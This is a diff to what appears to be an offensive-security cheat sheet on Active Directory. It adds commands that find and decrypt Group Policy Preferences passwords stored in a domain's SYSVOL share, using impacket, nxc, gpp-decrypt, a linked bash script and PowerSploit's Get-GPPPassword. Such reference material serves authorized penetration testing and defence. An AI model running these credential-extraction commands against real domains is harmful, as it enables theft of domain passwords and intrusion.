@@ -291,8 +291,17 @@ ntlmrelayx.py<span class="w"> </span>-6<span class="w"> </span>-wh<span class="w
 <div class="highlight"><pre><span></span><code>findstr<span class="w"> </span>/S<span class="w"> </span>cpassword<span class="w"> </span><span class="nv">$env</span>:logonserver<span class="se">\s</span>ysvol<span class="se">\*</span>.xml<span class="w"> </span><span class="c1"># Powershell</span>
 findstr<span class="w"> </span>/S<span class="w"> </span>cpassword<span class="w"> </span>%logonserver%<span class="se">\s</span>ysvol<span class="se">\*</span>.xml<span class="w"> </span><span class="c1"># CMD</span>
 </code></pre></div>
+<p>Find and decrypt GPP passwords remotely with <code>impacket</code>'s <code>Get-GPPPassword</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-Get-GPPPassword<span class="w"> </span><span class="s1">'&lt;domain&gt;/&lt;user&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>@<span class="s1">'&lt;target dc&gt;'</span>
+</code></pre></div>
+<p>Find and decrypt GPP passwords remotely with <code>nxc</code>:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="w"> </span>dc&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-M<span class="w"> </span>gpp_password
+</code></pre></div>
 <p>If some GPP relevant file is obtained from SYSVOL, it's possible to crack every password entry with the following command:</p>
 <div class="highlight"><pre><span></span><code>gpp-decrypt<span class="w"> </span>&lt;cPassword&gt;
+</code></pre></div>
+<p>If previous command does not work correctly, try this bash script <a href="https://gist.githubusercontent.com/rmrt1n/f1b01a4017036514cc2aac654f372fc7/raw/ce17d39c26f58c9543ba0848a59aa67e9baf5522/gpp-decrypt.sh">gpp-decrypt.sh</a>:</p>
+<div class="highlight"><pre><span></span><code>gpp-decrypt.sh<span class="w"> </span>&lt;cPassword&gt;
 </code></pre></div>
 <p>Moreover, the script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword</a> from PowerSploit exfiltrates and cracks GPP passwords:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Get-GPPPassword</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">passwords</span><span class="p">}</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">-Uniq</span>
